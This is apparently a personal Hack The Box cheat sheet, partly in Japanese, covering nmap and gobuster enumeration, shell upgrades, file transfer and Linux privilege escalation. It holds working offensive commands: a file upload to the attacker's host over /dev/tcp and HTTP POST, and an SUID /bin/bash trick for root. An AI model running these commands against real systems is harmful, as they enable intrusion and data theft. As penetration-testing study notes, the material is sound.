# My Directories
### alias <br>
htb <br>

~/htb/workspace <br>
~/htb/tools <br>
~/htb/ <br>


# Linux

## Nmap
#### 頻出オプション <br>
  ー -sC: equivalent to --script=default <br>
  ー -sV: Probe open ports to determine service/version info <br>
  ー -sU: UDP scan <br>
  ー -T<0-5>: Set timing template (higher is faster) <br>
　ー -p<0><-><65535> : -p22, 80, 55555 ・ -p1-100 等 <br>
  ー -p-: All ports <br>
  ー --top-ports <number>: Scan <number> most common ports <br>
  https://nmap.org/man/ja/man-briefoptions.html <br>

## Enumeration
・Gobuster <br>
  ー gobuster <br>
      　ー dir -u <target_url> -w <your_lists> <br>
      　ー dns -d <target_domain> -w <your_lists> <br>
      　ー vhost -u <target_url> -w <your_lists> <br>
      
  ー  <br>

  https://www.kali.org/tools/gobuster/ <br>

## Shell Upgrade
Shell to Bash <br>
Upgrade from shell to bash. <br>

```
SHELL=/bin/bash script -q /dev/null
```
 <br>
Python PTY Module 1 <br>
Spawn /bin/bash using Python’s PTY module, and connect the controlling shell with its standard I/O. <br>

```
python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 <br>

## File Upload/Download
### 1. Download <br>
```
python3 -m http.server <your_port>
```
and then
```
wget http://<your_ip>/ <your_port>
```

### 2. Upload <br>
```
python3 -m uploadserver (default_port ==> 8000)
```
and then
```
python3 -c "import requests;requests.post(\"http://<your_ip>:8000/upload\",files={\"files\":open(\"<upload_file>\",\"rb\")})"
```
#### OR
```
nc -lvnp <your_port> > <your_file_name(anything is OK(example: upload.jar))>
```
and then
```
cat <upload_file> > /dev/tcp/<your_ip>/<your_port>
```

## Privilege Escalation
・sudo -l <br>
  ー 1. root権限で実行できるコトを探す。 <br>
  ー 1-1. GTFOBinsでexploitを探す。 <br>
  ー 2. 実行できるコトを悪用する。 <br>
  　ー 2-1. Pythonスクリプトをローカルのshを参照して実行している場合に、ディレクトリを移動して独自のshを実行するようにする場合。 <br>
   　ー 2-2. hogehoge.shの中身を#!/bin/bash \n chmod u+s /bin/bashとする。それを実行させる。 <br>
    　ー 2-3. bash -p 実行。→ 特権昇格。 <br>      
・linPEAS: sudo -lしてもいい感じの出てこないときに使う。 <br>
  ー 1. linPEASでUnknown SUID binaryを特定。 <br>
  ー 2. そのコマンドのバージョンを確認。脆弱性を探す。 <br>
  ー 3. 脆弱性を突いて特権昇格。 <br>
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS?source=post_page-----7b26a767293a--------------------------------

# Windows
